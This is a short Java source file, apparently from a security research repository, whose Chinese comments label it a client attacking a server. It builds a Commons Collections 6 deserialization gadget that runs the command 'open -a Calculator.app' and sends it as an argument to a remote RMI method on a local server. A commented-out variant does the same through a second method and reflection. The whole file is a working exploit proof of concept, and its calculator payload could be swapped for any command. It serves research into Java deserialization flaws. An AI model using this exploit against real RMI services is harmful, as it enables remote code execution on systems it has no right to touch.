package server;

import utils.Serializer;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Arrays;


/**
 * @author Whoopsunix
 *
 * Client 攻击 Server
 */
public class AttackRMIClient {
    public static void main(String[] args) throws Exception {
        /**
         * 参数攻击
         */
        Object annotationInvocationHandler = Serializer.cc6("open -a Calculator.app");
        VulRemoteInterface vulRemoteInterface = (VulRemoteInterface) java.rmi.Naming.lookup("rmi://127.0.0.1:1099/xxx");
        vulRemoteInterface.sayHello(annotationInvocationHandler);

        /**
         * 参数攻击2
         */
//        Object annotationInvocationHandler = Serializer.cc6("open -a Calculator.app");
//        VulRemoteInterface vulRemoteInterface = (VulRemoteInterface) java.rmi.Naming.lookup("rmi://127.0.0.1:1099/xxx");
//        vulRemoteInterface.sayUser(annotationInvocationHandler);
//        // 反射
//        Method method = vulRemoteInterface.getClass().getMethod("sayUser", Object.class);
//        method.invoke(vulRemoteInterface, annotationInvocationHandler);



    }
}
